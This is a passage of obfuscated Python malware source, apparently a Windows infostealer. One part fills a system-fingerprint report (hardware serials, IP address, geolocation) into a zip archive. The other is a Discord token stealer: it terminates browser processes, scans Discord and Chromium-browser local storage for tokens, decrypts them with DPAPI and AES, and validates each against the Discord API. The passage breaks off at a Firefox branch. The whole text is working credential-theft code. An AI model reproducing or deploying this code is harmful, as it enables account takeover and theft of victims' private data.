 - DisplayName : {IACEFSHGQARRVESHBISUJLYOIFQSMCOFDHHZEKCHHAJTEZSFIRFWCUFIFAMXRIPJPNYFWBAIZCVGFTBSUSUUPOHQUFQHTED}

System:
 - Plateform     : {WQASSLBOSBVRJSNJXWUZBZXULMGCSMCYFQGABDGVHNIJYZFFURKFQRYEGAQHQLWVZNDXJCS}
 - Exploitation  : {WAJINLNHCKCGXQRUJKHVERVXGXOWNUZSZGVMZRJMZRXNDZXPMMKDPUWHPUHAMWCCEDRGMWLY} {JSMNRXZRGBAKYXSGDVGAPDDYJEUHKPOFKTWWPQRARNGGWVRDVNMSUMAVWJZZSALSMARGTGTKPCBWZHNXQBD}
 - Screen Number : {BGHTEWGJLVSIJNTKOIIYBGUBHZBFFRVGNVNHYDSJJBLVCDGDBFLZXYYYOJESTWXOHVGDMLNTCEIAAQDJDREDMSZWBXETGCXNH}

Peripheral:
 - CPU : {SVQVLXXPWRZQXVVTDWDBBEHEBQTODMFBUNNJDPYZJTNSFEHVVAEZCOYGFXASHTDJMN}, {YUYUUTWRBQPMLZYCNUGMTZXNSAXBBBXZABOXTFAHMJUANJMDBPLWBHGYYURQDSCIVNFEOYP} 
 - GPU : {YWMKEFZCUGATGVWICRHWLRNZBYSKEZTRZQBWDVVXYWMWZCCSGYZVHFWYQWKYTCGOVDMJELXWJORRTJUQVPO}
 - RAM : {SWOZZALMWMVECHMBTBFYNXPRVGUEMYPOVFMKCMYKHNTJNUEHTWYZJNSRWJRXCWPNPIMKMCJSTDMGLPQMLQPGARLHEFN}

Disk:
{ZZRHJCDWOMSOFIEERGOUZKSZZXSSLIQACHIIHMVENJPJHWHYVKOHJKJKFUPAIUUWDLQXU}

Serial Number:
 - MAC                       : {WDAOBJMLAVPEAZAUJYFYTYIZQLKRHSLCKGDGQQDBOAVZJKQPMKMDLTLENTMKNSZLBRZMBLFJBUGEVYVNJWTGNBZDDNNVJV}
 - Machine Id                : {SQJQUQOEKJFDJLSMYGDVSOUBILDSASMNBHXDVKWCDNLGEPJXKSUSYIMCMYMAESJAJBWLNKDBAHDRKLWSEXCGRVUOQQQEJUSRDTG}
 - Machine Guid              : {MZSYFLQWUZNWRETTFTCZBEPRTNDIAHPLGFBDZWSAEINIIDINRKTKINAFOUPFNCMEMFURSROOGRFBAP}
 - Hw Profile Guid           : {IQABSKMPWVGLTFYFECEIXNBNSSBNFEDARPESXLBHHFQLVUJPKMOLKEKX}
 - Nvidia System Id          : {FKOJNNQJLNMDQTYQLOITYSFMHIJZQXQCFWVSUCZGLBSJKVSAEBQNPSWVDMLPSYAXRAEGMURLVHYMTJOBXJZRKJJPJYIEUWTZUUGY}
 - Guid Serial Number        : {MCSDATILBKFIBYPDBLDSAIMSGLGHQCKXXYRWNCUOWOCVJLKYQCNKYDUQCUJFDFIOFKSMGYEZROD}
 - Uuid Serial Number        : {IPEHOWHFEGBTQNREDNVRWGEISZBYFFGVSIVYTHHDWATSSMOENEYLVRRRZQKIMIYWVFZEMFMQTPVSABKCPHSPHGKBMIHQZEFZP}
 - Motherboard Serial Number : {TGMJKLTQAEBCRKEAEQXVPYHUPSDVGIFPYGFUJAIZDEYLAEBUHTHKJUUYLWUGCTJMSEUVXGDPDAQFAZUDJ}
 - Motherboard Product       : {KWVAOPHCDZRIDJHLRQXVMWBBOPADPUCOCGGBEQTBMGNDPJNDZXTQ}
 - Motherboard Manufacturer  : {MELHJEZRDFNLRFLPIHEUFIEPZWWVBKODOCVOZFZYLDADEFOXLBVDZQNLTZHUMPPDAICPSBMGXIFYFYDQPMG}
 - Processor Serial Number   : {SEFLIRMDPPZVJSYHIEDYORCUOHMKGRCXMXPTABYEZMAZSKWIQKGIQROSJMCSIYDBR}
 - Bios Serial Number        : {VITUAVYYTLGXGMNYOZNLBCXOYHLFFSAGEEMWDRGFWSGZTIVLDHMNYZOLGBPNQMSAPBGZBUAISKRHFSVWO}
 - Bios Release Date         : {JZISRFUPCAUFHLYNFOPFOVYYVGLUISZENYDHDLBNVRMXIGLLUXNNXAZQUZYZZAADWJCPJBLDZ}
 - Bios Version              : {CEDITJHCRDZVRDQSUIVFODMDLWHKDXWIGKYMYRLTKEYMRKKZXLEMVECIOLQLOCLNXUACXIYOWCZBZXVKJAULPDE}
 - System Bios Version       : {QCFURSVZUOVUSIHBKAYBVMMHJGVNKQMSJRBJGEKOQIYPZVMHVEDLFEGWLFUDCMQUEQFQYLVJFJPIBGZBURGMLSSTPIYXQSYW}
 - System Version            : {IIYWWYPGYHAABFKADYWXZVOGDTTJUUBHAQTNXLMBGVKFCGVFOLEMHGSXEZRVAXUGXSSIDPOLLQZNJPBERBJQ}
 - System Family             : {IIISXCNJOQOZSJPFXMNVWLNKGGXMPBXIJHQXFAKLCQQCTBWYEFWUFFRIGNTHZLZNWOVZBKWSNLWEH}
 - System Manufacturer       : {AATXWYGNPDYGOUWEZIMRYQNVTKTUWSVYMAIKISUFQDAHRVHDOJCOCPCUPZIVLJRYKLRTGHSPRMRRZRLKSLZZDRBT}
 - System Product            : {OXYQZGVEIWBJUYZMFRFKKHFAPOYQGBGDHWWBMDFACUXNSLBVPVTGDVHXUKMNSYPIXHQTOYRT}
 - System SKU                : {PSTTQOCAMRWZHFJGWMBKUURGXMMEQWQXRYRHDEVLHPXWXGQNHUOWNUONWULFXDBKONKN}
 - Oem String Serial Number  : {PTODPGJQBTPOPBGYSAVVNMDHUBMYZFUMNCWTEJLADLSFYFAQSAMNYMSJIOIPVYNLNWWHCALEVBJH}
 - Asset Tag Serial Number   : {WYFTDGIPZTXEWCRLVAVGNTVKHJNTOJMFDFXJQMXNADQPQWRQWRXIEBYZMNVDDXWKDYNDWZLUKYRDHUXSNEKRIYHQGSWKZSFO}

Ip:
 - Public : {TVIPPGRBPOIJUAXNDOAKYCYREAOJOIUYQHULEIOPTOBPVVCMOVNEGQBTPYHYUZMYMDGKFKLAAPTBSZPLVHFFYNHNJOZTJLB}
 - Local  : {IJNJRHWBPXVRYQAVAHZQTJDLXJLTLZDLBGJVYEXGTLKPIFBTHBFPPXRAXDUQ}

Ip Information:
 - Isp : {YOITRQQPQBXAJWUFLXPJQZPCUXWIVTZKYEVNUPMHLNKQVMEGPVCRTEJORAOINCOY}
 - Org : {VAJQACUMGTMNABPEEBAYXDYBTFCIFENJDDCNBODLNOZGUCUIHEAFIMLEMYXWGPQRQIVHGPR}
 - As  : {OUMDXVKKFONDGXGNBZYALLJETDCRAKACGVUNMZLMZQGAQIBSWGFJFDUPUAYSWCYRPO}

Ip Location:
 - Country   : {SDERCMEGGQSIOKANVXBVZJNYHKIDDMKAMDVMIHPJDBNLMLQSMKTCEKWPJFFZDANGIJLEYKNYA} ({SDERCMEGGQSIOKANVXBVZJNYHKIDDMKAMDVMIHPJDBNLMLQSMKTCEKWPJFFZDANGIJLEYKNYA_code})
 - Region    : {WLUTMGMFMXEQNANHDJCUSFVQXEMQNTNLUMAMWFYNSEWZPIWQBTIQASXXQWOHDIUOKTPBPCYGFJI} ({WLUTMGMFMXEQNANHDJCUSFVQXEMQNTNLUMAMWFYNSEWZPIWQBTIQASXXQWOHDIUOKTPBPCYGFJI_code})
 - Zip       : {MTISSDZFWNYAXCERMRZCKAKRAOGUGHHSCQBOZXMZASZDHVTOHQPNEBLHKQJHEAORPQHLSSPB}
 - City      : {PNJNDGJWQKFOYXQKFZUORYYNJPBGWCEGWIOLKQICZITAKSSOEHB}
 - Timezone  : {AOWNABHYHTDZPDQTEUUIPKGPALJFGXKQREIALIMVAZJZRDMCYNVDOK}
 - Longitude : {UGSICVXWUSHVJHITDDQOLTJNPLEYOKETLZEEDJJBLPJUNFTQXXGPIYZDRNBAWXONFROJUYVOVHIIEOQEW}
 - Latitude  : {LJFQIOVCCCQPZZGKDJPKOYKLZHCKJVDYDADBFVQMGSBEGLMYCPDHWRZXGZAJENHYRJPOQUGHFH}
"""
    DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.writestr("System Info.txt", HAZMCPMSLOTDYUWAUUBRRSEMTNOFIMXZCFRJPGEISDYFANTHNMFTBZDUPBACLQMOI)

    return AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_system_info

def ILNPQPVPIZKLRCBFQFFSHQNUJGUDLFDHIBRBFQAYXBAHCDPOOU(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM):
    import os
    import re
    import json
    import base64
    import requests
    import psutil
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData

    JDFEZDCKYFEIIQMFHQYNTGNZVSOGGQYFEERVUJWKEHZGUVXFVUOWRUHNILYHITITIUJSYNJOJTUFVWKFEXNBVOSZZRYONL = ""
    YFEZMISLJMYSWEDZLYCLSTXZUXKOCPQTPFZCEFBJSRTBEYRTGWKZVGGYCBHLVMLWCBOIKKFCBMVEOVYHRXKJFT = 0

    def IUGKUBRYCOJWITNBAMOCKEBBBZOWFZLCIMJBCBOLJKWOGXBLOSIHXKUIRXDKNYVBBUT():  
        JJWOARJNTTIPUMNJUEADQJZIQXEUKHYVYJFHNRHPHHWHQZYGSKGXISUAXNRDUNYFGNORAVUHOROOPYTW = "https://discord.com/api/v9/users/@me"
        NXZLADNAGNEILSCBDAVQSSJDUPOVLJELWQLSMAWUOVQWVMPJEHHWIJHZRRR = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        NXZLADNAGNEILSCBDAVQSSJDUPOVLJELWQLSMAWUOVQWVMPJEHHWIJHZRRR_enc = r"dQw4w9WgXcQ:[^\"]*"
        SEEXUUULQTOCDMMZIFMACCCPFDPANIAIXEFWPPPCVVBUFDGAIFEVWTHBMOFFVDDBEXHVBSTRJLDCLLKFDBIDYIJQWRF = []
        GXQRDSXYACEJSDHYTGBNWCNWAZNEJWQNVRAHYCBCLYPOHBWYUAPJWQAJVHUDUKZQB = []
        HXERNJKKNPZDCERIZOHFMLHYTRWVDMRMDOCMONFWRMTLZQFJUCDNSLEQASCHHSRLTPYZDMUVDODGRRREIAKNQKZOTYQNVPNHN = {}

        PHXSUJEVAVIYWUZLBJCWSDLWUDFETJMFAJTVFAEQHOPPWBZTRQGQXEPMXVYIBWIEJIN = [
            ("Discord",                os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "discord", "Local Storage", "leveldb"),                                                  ""),
            ("Discord Canary",         os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "discordcanary", "Local Storage", "leveldb"),                                            ""),
            ("Lightcord",              os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "Lightcord", "Local Storage", "leveldb"),                                                ""),
            ("Discord PTB",            os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "discordptb", "Local Storage", "leveldb"),                                               ""),
            ("Opera",                  os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
            ("Opera GX",               os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
            ("Opera Neon",             os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
            ("Amigo",                  os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
            ("Torch",                  os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
            ("Kometa",                 os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
            ("Orbitum",                os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
            ("CentBrowser",            os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
            ("7Star",                  os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
            ("Sputnik",                os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
            ("Vivaldi",                os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
            ("Google Chrome",          os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
            ("Google Chrome",          os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome SxS",      os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Beta",     os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
            ("Google Chrome Dev",      os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Unstable", os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
            ("Google Chrome Canary",   os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
            ("Epic Privacy Browser",   os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
            ("Microsoft Edge",         os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
            ("Uran",                   os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
            ("Yandex",                 os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
            ("Yandex Canary",          os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
            ("Yandex Developer",       os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
            ("Yandex Beta",            os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex Tech",            os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex SxS",             os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
            ("Brave",                  os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
            ("Iridium",                os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
        ]

        
        try:
             for GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, v4r_proc_name in PHXSUJEVAVIYWUZLBJCWSDLWUDFETJMFAJTVFAEQHOPPWBZTRQGQXEPMXVYIBWIEJIN:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.name().lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except: pass
        except: pass

        for GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, v4r_proc_name in PHXSUJEVAVIYWUZLBJCWSDLWUDFETJMFAJTVFAEQHOPPWBZTRQGQXEPMXVYIBWIEJIN:
            if not os.path.exists(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ):

                continue
            OMVKNLQMPKKVIFCKHFTAQRPISKOKASCSDNELRQKSLNHCJCQNSYZHGNWLKMYKQHHGLVVJBYEYTVYHXXTZBPDXXKFLE = GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON.replace(" ", "").lower()
            if "cord" in BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ:
                if not os.path.exists(os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, OMVKNLQMPKKVIFCKHFTAQRPISKOKASCSDNELRQKSLNHCJCQNSYZHGNWLKMYKQHHGLVVJBYEYTVYHXXTZBPDXXKFLE, 'Local State')):
                    continue
                for v4r_file_name in os.listdir(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    XOHFUQYFHTDPMGRPSYTGPNJYQUOZAIGZNPKXTBLSGPDWUSTBJRHJAWKBQMKQKXOGIEARNIO = os.path.join(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, v4r_file_name)
                    if os.path.exists(XOHFUQYFHTDPMGRPSYTGPNJYQUOZAIGZNPKXTBLSGPDWUSTBJRHJAWKBQMKQKXOGIEARNIO):
                        with open(XOHFUQYFHTDPMGRPSYTGPNJYQUOZAIGZNPKXTBLSGPDWUSTBJRHJAWKBQMKQKXOGIEARNIO, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for y in re.findall(NXZLADNAGNEILSCBDAVQSSJDUPOVLJELWQLSMAWUOVQWVMPJEHHWIJHZRRR_enc, v4r_line.strip()):
                                    QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH = ZDSNZWOYTHNBFKJSWQHPILSTVSBDQXZKAZDMXISTBAHLWBAOKYKIUZMTRLLLENHXGPXDGVCCRSOOCAHBRVFTHMZKLVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), EXNPYQCEWBCCFBQLNUXKUAVXUJEKEYSNYBRYNMSTACQJEKSVMSSCKRVQHHBIKGHKZFAEELNKDYQFXNYDHXFY(os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, OMVKNLQMPKKVIFCKHFTAQRPISKOKASCSDNELRQKSLNHCJCQNSYZHGNWLKMYKQHHGLVVJBYEYTVYHXXTZBPDXXKFLE, 'Local State')))
                                    if LLAUJEGMQHEWYWNTSNHHUEGZJQXAIKRVGQPKRTVQFAGRFUUKTNMRBKXVW(QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH, JJWOARJNTTIPUMNJUEADQJZIQXEUKHYVYJFHNRHPHHWHQZYGSKGXISUAXNRDUNYFGNORAVUHOROOPYTW):
                                        TRNOTBGSRXPESQZIKUKAIRGIETGFMHENENFKGDQKALKDIZULVFXHSEPKXH = requests.get(JJWOARJNTTIPUMNJUEADQJZIQXEUKHYVYJFHNRHPHHWHQZYGSKGXISUAXNRDUNYFGNORAVUHOROOPYTW, headers={'Authorization': QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH}).json()['id']
                                        if TRNOTBGSRXPESQZIKUKAIRGIETGFMHENENFKGDQKALKDIZULVFXHSEPKXH not in GXQRDSXYACEJSDHYTGBNWCNWAZNEJWQNVRAHYCBCLYPOHBWYUAPJWQAJVHUDUKZQB:
                                            SEEXUUULQTOCDMMZIFMACCCPFDPANIAIXEFWPPPCVVBUFDGAIFEVWTHBMOFFVDDBEXHVBSTRJLDCLLKFDBIDYIJQWRF.append(QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH)
                                            GXQRDSXYACEJSDHYTGBNWCNWAZNEJWQNVRAHYCBCLYPOHBWYUAPJWQAJVHUDUKZQB.append(TRNOTBGSRXPESQZIKUKAIRGIETGFMHENENFKGDQKALKDIZULVFXHSEPKXH)
                                            HXERNJKKNPZDCERIZOHFMLHYTRWVDMRMDOCMONFWRMTLZQFJUCDNSLEQASCHHSRLTPYZDMUVDODGRRREIAKNQKZOTYQNVPNHN[QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH] = (GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, XOHFUQYFHTDPMGRPSYTGPNJYQUOZAIGZNPKXTBLSGPDWUSTBJRHJAWKBQMKQKXOGIEARNIO)
            else:
                for v4r_file_name in os.listdir(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    XOHFUQYFHTDPMGRPSYTGPNJYQUOZAIGZNPKXTBLSGPDWUSTBJRHJAWKBQMKQKXOGIEARNIO = os.path.join(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, v4r_file_name)
                    if os.path.exists(XOHFUQYFHTDPMGRPSYTGPNJYQUOZAIGZNPKXTBLSGPDWUSTBJRHJAWKBQMKQKXOGIEARNIO):
                        with open(XOHFUQYFHTDPMGRPSYTGPNJYQUOZAIGZNPKXTBLSGPDWUSTBJRHJAWKBQMKQKXOGIEARNIO, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH in re.findall(NXZLADNAGNEILSCBDAVQSSJDUPOVLJELWQLSMAWUOVQWVMPJEHHWIJHZRRR, v4r_line.strip()):
                                    if LLAUJEGMQHEWYWNTSNHHUEGZJQXAIKRVGQPKRTVQFAGRFUUKTNMRBKXVW(QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH, JJWOARJNTTIPUMNJUEADQJZIQXEUKHYVYJFHNRHPHHWHQZYGSKGXISUAXNRDUNYFGNORAVUHOROOPYTW):
                                        TRNOTBGSRXPESQZIKUKAIRGIETGFMHENENFKGDQKALKDIZULVFXHSEPKXH = requests.get(JJWOARJNTTIPUMNJUEADQJZIQXEUKHYVYJFHNRHPHHWHQZYGSKGXISUAXNRDUNYFGNORAVUHOROOPYTW, headers={'Authorization': QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH}).json()['id']
                                        if TRNOTBGSRXPESQZIKUKAIRGIETGFMHENENFKGDQKALKDIZULVFXHSEPKXH not in GXQRDSXYACEJSDHYTGBNWCNWAZNEJWQNVRAHYCBCLYPOHBWYUAPJWQAJVHUDUKZQB:
                                            SEEXUUULQTOCDMMZIFMACCCPFDPANIAIXEFWPPPCVVBUFDGAIFEVWTHBMOFFVDDBEXHVBSTRJLDCLLKFDBIDYIJQWRF.append(QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH)
                                            GXQRDSXYACEJSDHYTGBNWCNWAZNEJWQNVRAHYCBCLYPOHBWYUAPJWQAJVHUDUKZQB.append(TRNOTBGSRXPESQZIKUKAIRGIETGFMHENENFKGDQKALKDIZULVFXHSEPKXH)
                                            HXERNJKKNPZDCERIZOHFMLHYTRWVDMRMDOCMONFWRMTLZQFJUCDNSLEQASCHHSRLTPYZDMUVDODGRRREIAKNQKZOTYQNVPNHN[QXLWLYRXSIBDDMMNSXTQDUCVIDNCQVURHEUSQECIDWKDUNSRVFLMSAIAWQNORMGYRYSMJUWQVDJH] = (GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, XOHFUQYFHTDPMGRPSYTGPNJYQUOZAIGZNPKXTBLSGPDWUSTBJRHJAWKBQMKQKXOGIEARNIO)

        if os.path.exists(os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "Mozilla", "Firefox", "Profiles")):
